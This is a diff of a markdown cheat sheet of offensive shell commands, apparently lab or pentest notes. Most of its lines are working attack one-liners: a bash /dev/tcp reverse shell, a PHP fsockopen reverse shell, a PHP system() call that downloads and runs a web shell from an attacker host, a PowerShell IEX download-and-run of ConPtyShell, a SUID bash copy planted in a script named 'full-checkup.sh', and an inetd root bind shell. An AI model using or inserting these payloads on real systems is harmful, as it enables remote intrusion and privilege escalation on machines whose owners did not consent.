@@ -2,7 +2,7 @@
 
 #### BASH
 ```bash
-bash -i >& /dev/tcp/192.168.45.187/8091 0>&1
+bash -i >& /dev/tcp/192.168.45.238/60001 0>&1
 
 echo -e '#!/bin/bash\n\ncp /bin/bash /tmp/pwned\nchmod 4777 /tmp/pwned' > full-checkup.sh
 chmod +x full-checkup.sh
@@ -11,13 +11,13 @@ chmod +x full-checkup.sh
 #### PHP
 
 ```bash
-php -r '$sock=fsockopen("192.168.45.187", 443);exec("/bin/sh -i <&3 >&3 2>&3");'
+php -r '$sock=fsockopen("192.168.45.238", 60001);exec("/bin/sh -i <&3 >&3 2>&3");'
 
 cp /usr/share/webshells/php/php-reverse-shell.php .
 mv php-reverse-shell.php shell.php
 python3 -m http.server
 nc -nlvp 443
-<?php system("wget http://<kali IP>/shell.php -O /tmp/shell.php;php /tmp/shell.php");?>
+<?php system("wget http://192.168.45.238/shell.php -O /tmp/shell.php;php /tmp/shell.php");?>
 
 cp /usr/share/webshells/php/php-reverse-shell.php .
 python3 -m http.server 800
@@ -114,4 +114,11 @@ If that doesn't work, you could have him connect back to us so that we could cra
 ```bash
 cat conpty.php
 system("powershell IEX(IWR http://10.10.14.8:8000/conpty.ps1 -UseBasicParsing); Invoke-ConPtyShell 10.10.14.8 80");
+```
+
+#### Inet Bind Shell ??
+
+```bash
+"echo '31337 stream tcp nowait root /bin/sh -i' >> /etc/inetd.conf"
+nc -nv $ip 31337
 ```
